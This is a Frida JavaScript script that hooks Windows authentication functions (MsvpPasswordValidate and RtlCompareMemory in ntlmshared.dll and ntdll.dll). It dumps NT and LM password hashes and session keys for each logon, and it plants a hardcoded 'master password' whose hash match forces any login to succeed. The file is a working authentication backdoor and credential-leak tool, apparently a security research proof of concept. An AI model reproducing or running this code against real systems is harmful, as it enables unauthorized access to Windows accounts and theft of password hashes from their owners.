//-----------------------------------------------------------//
// Hook MsvpPasswordValidate to bypass auth & demo NTLM leak //
// |_ Targets Windows 10 where MsvpPasswordValidate is       //
//    exported by ntlmshared.dll                             //
//-----------------------------------------------------------//

// Functions
//----------------------------------------------
var pMsvpPasswordValidate = Module.findExportByName('ntlmshared.dll', 'MsvpPasswordValidate');
var pRtlCompareMemory = Module.findExportByName('ntdll.dll', 'RtlCompareMemory');

// Globals
//----------------------------------------------
var UNICODE_STRING_Size;
var UNICODE_STRING_BufferOffset;
var Arch_Pointer_Size;
if (Process.arch == "x64") {
    UNICODE_STRING_Size = 0x10;
    UNICODE_STRING_BufferOffset = 0x8;
    Arch_Pointer_Size = 0x8;
} else {
    UNICODE_STRING_Size = 0x8;
    UNICODE_STRING_BufferOffset = 0x4;
    Arch_Pointer_Size = 0x4;
}

// Login bypass global
var bypassLogin = false;

// Enum
//----------------------------------------------
var NETLOGON_LOGON_INFO_CLASS = {
    NetlogonInteractiveInformation: 1,
    NetlogonNetworkInformation: 2,
    NetlogonServiceInformation: 3,
    NetlogonGenericInformation: 4,
    NetlogonInteractiveTransitiveInformation: 5,
    NetlogonNetworkTransitiveInformation: 6,
    NetlogonServiceTransitiveInformation: 7
}

var LOGON_FLAGS = {
    LOGON_GUEST: 1,
    LOGON_NOENCRYPTION: 2,
    LOGON_CACHED_ACCOUNT: 4,
    LOGON_USED_LM_PASSWORD: 8,
    LOGON_EXTRA_SIDS: 32,
    LOGON_SUBAUTH_SESSION_KEY: 64,
    LOGON_SERVER_TRUST_ACCOUNT: 128,
    LOGON_NTLMV2_ENABLED: 256,
    LOGON_RESOURCE_GROUPS: 512,
    LOGON_PROFILE_PATH_RETURNED: 1024,
    LOGON_GRACE_LOGON: 16777216
}

// Helpers
//----------------------------------------------
function arrBuffToHStr(arrB) {
    var arrU = new Uint8Array(arrB);
    var nStr = "";
    for(var i = 0; i < arrU.length; i++) {
        nStr += (('0' + arrU[i].toString(16)).slice(-2) + "");
    }
    return nStr;
}

function getUnicodeStringValue(pUNICODE_STRING) {
    var len = pUNICODE_STRING.readU16();
    if (len == 0) {
        return "N/A";
    } else {
        return ((pUNICODE_STRING.add(UNICODE_STRING_BufferOffset)).readPointer()).readUtf16String(len/2);
    }
}

function getLogonLevel(flag) {
    if (flag == NETLOGON_LOGON_INFO_CLASS.NetlogonInteractiveInformation) return "NetlogonInteractiveInformation";
    if (flag == NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkInformation) return "NetlogonNetworkInformation";
    if (flag == NETLOGON_LOGON_INFO_CLASS.NetlogonServiceInformation) return "NetlogonServiceInformation";
    if (flag == NETLOGON_LOGON_INFO_CLASS.NetlogonGenericInformation) return "NetlogonGenericInformation";
    if (flag == NETLOGON_LOGON_INFO_CLASS.NetlogonInteractiveTransitiveInformation) return "NetlogonInteractiveTransitiveInformation";
    if (flag == NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation) return "NetlogonNetworkTransitiveInformation";
    if (flag == NETLOGON_LOGON_INFO_CLASS.NetlogonServiceTransitiveInformation) return "NetlogonServiceTransitiveInformation";
}

function getUserFlags(flag) {
    if (flag == LOGON_FLAGS.LOGON_GUEST) return "LOGON_GUEST";
    if (flag == LOGON_FLAGS.LOGON_NOENCRYPTION) return "LOGON_NOENCRYPTION";
    if (flag == LOGON_FLAGS.LOGON_CACHED_ACCOUNT) return "LOGON_CACHED_ACCOUNT";
    if (flag == LOGON_FLAGS.LOGON_USED_LM_PASSWORD) return "LOGON_USED_LM_PASSWORD";
    if (flag == LOGON_FLAGS.LOGON_EXTRA_SIDS) return "LOGON_EXTRA_SIDS";
    if (flag == LOGON_FLAGS.LOGON_SUBAUTH_SESSION_KEY) return "LOGON_SUBAUTH_SESSION_KEY";
    if (flag == LOGON_FLAGS.LOGON_SERVER_TRUST_ACCOUNT) return "LOGON_SERVER_TRUST_ACCOUNT";
    if (flag == LOGON_FLAGS.LOGON_NTLMV2_ENABLED) return "LOGON_NTLMV2_ENABLED";
    if (flag == LOGON_FLAGS.LOGON_RESOURCE_GROUPS) return "LOGON_RESOURCE_GROUPS";
    if (flag == LOGON_FLAGS.LOGON_PROFILE_PATH_RETURNED) return "LOGON_PROFILE_PATH_RETURNED";
    if (flag == LOGON_FLAGS.LOGON_GRACE_LOGON) return "LOGON_GRACE_LOGON";
}

// typedef struct _NETLOGON_LOGON_IDENTITY_INFO {
//   UNICODE_STRING    LogonDomainName;
//   ULONG             ParameterControl;
//   OLD_LARGE_INTEGER LogonId;
//   UNICODE_STRING    UserName;
//   UNICODE_STRING    Workstation;
// } NETLOGON_LOGON_IDENTITY_INFO, *PNETLOGON_LOGON_IDENTITY_INFO;
function parseLogonIdentityInfo(pData) {
    send("        |_ LogonDomainName       : " + getUnicodeStringValue(pData));
    var parameterControl = (pData.add(UNICODE_STRING_Size)).readU32();
    send("        |_ ParameterControl      : " + parameterControl);
    var logonId = (pData.add(UNICODE_STRING_Size + 0x8)).readPointer();
    send("        |_ LogonId               : " + logonId);
    var userName = getUnicodeStringValue(pData.add(UNICODE_STRING_Size + 0x10));
    send("        |_ UserName              : " + userName);
    var workstation = getUnicodeStringValue(pData.add((UNICODE_STRING_Size*2) + 0x10));
    send("        |_ Workstation           : " + workstation);
}

// typedef struct _SAMPR_USER_INTERNAL1_INFORMATION {
// 	BYTE NTHash[LM_NTLM_HASH_LENGTH];
// 	BYTE LMHash[LM_NTLM_HASH_LENGTH];
// 	BYTE NtPasswordPresent;
// 	BYTE LmPasswordPresent;
// 	BYTE PasswordExpired;
// 	BYTE PrivateDataSensitive;
// } SAMPR_USER_INTERNAL1_INFORMATION, *PSAMPR_USER_INTERNAL1_INFORMATION;
function parseUserInternal1Information(pData) {
    var ntHash = pData.readByteArray(0x10);
    send("        |_ NTHash                : " + arrBuffToHStr(ntHash));
    var lmHash = (pData.add(0x10)).readByteArray(0x10);
    send("        |_ LMHash                : " + arrBuffToHStr(lmHash));
    var ntPasswordPresent = (pData.add(0x20)).readU8();
    send("        |_ NtPasswordPresent     : " + ntPasswordPresent);
    var lmPasswordPresent = (pData.add(0x20 + 1)).readU8();
    send("        |_ LmPasswordPresent     : " + ntPasswordPresent);
    var passwordExpired = (pData.add(0x20 + 2)).readU8();
    send("        |_ PasswordExpired       : " + passwordExpired);
    var privateDataSensitive = (pData.add(0x20 + 3)).readU8();
    send("        |_ PrivateDataSensitive  : " + privateDataSensitive);
}

// Hooks
//----------------------------------------------

// BOOLEAN   
// MsvpPasswordValidate (   
//     IN BOOLEAN UasCompatibilityRequired,   
//     IN NETLOGON_LOGON_INFO_CLASS LogonLevel,   
//     IN PVOID LogonInformation,   
//     IN PUSER_INTERNAL1_INFORMATION Passwords,   
//     OUT PULONG UserFlags,   
//     OUT PUSER_SESSION_KEY UserSessionKey,   
//     OUT PLM_SESSION_KEY LmSessionKey   
// )
Interceptor.attach(pMsvpPasswordValidate, {
    onEnter: function (args) {
        send("\n[?] Called MsvpPasswordValidate..");
        send("    |-> UasCompatibilityRequired : " + args[0]);
        send("    |-> LogonLevel               : " + getLogonLevel(args[1]));
        send("    |-> LogonInformation");
        parseLogonIdentityInfo(args[2]);
        send("    |-> Passwords");
        parseUserInternal1Information(args[3])

        // Read these on the return
        this.UserFlags = args[4];
        this.UserSessionKey = args[5];
        this.LmSessionKey = args[6];
        
    },
    onLeave: function (retval) {
        send("    |-> UserFlags                : " + getUserFlags(this.UserFlags.readU32()));
        send("    |-> UserSessionKey"); this.UserSessionKey
        send("        |_ CYPHER_BLOCK          : " + arrBuffToHStr(this.UserSessionKey.readByteArray(0x8)));
        send("        |_ CYPHER_BLOCK          : " + arrBuffToHStr((this.UserSessionKey).add(0x8).readByteArray(0x8)));
        send("    |-> LmSessionKey");
        send("        |_ CYPHER_BLOCK          : " + arrBuffToHStr(this.LmSessionKey.readByteArray(0x8)));
        send("        |_ CYPHER_BLOCK          : " + arrBuffToHStr((this.LmSessionKey).add(0x8).readByteArray(0x8)));

        if (bypassLogin) {
            // Overwrite retval
            send("\n [+] Master password detected, bypassing auth..");
            retval.replace(ptr(0x1));

            // Revert global
            bypassLogin = false;
        }
    }
});

// NTSYSAPI
// RtlCompareMemory(
//   const VOID *Source1,
//   const VOID *Source2,
//   SIZE_T     Length
// );
Interceptor.attach(pRtlCompareMemory, {
    onEnter: function (args) {
        // Is RtlCompareMemory called from MsvpPasswordValidate?
        var nTraceArray = Thread.backtrace(this.context, Backtracer.ACCURATE);
        if ((DebugSymbol.fromAddress(nTraceArray[0]).toString()).endsWith("MsvpPasswordValidate")) {

            // Does the second block of memory match our master password?
            // |-> "0-10PowerSpike" -> 98c738d472bac12012e3242a90df8b6a
            var Source2 = arrBuffToHStr(args[1].readByteArray(0x10));
            if (Source2 == "98c738d472bac12012e3242a90df8b6a") {
                // Set global
                bypassLogin = true;
            }
        }
    }
});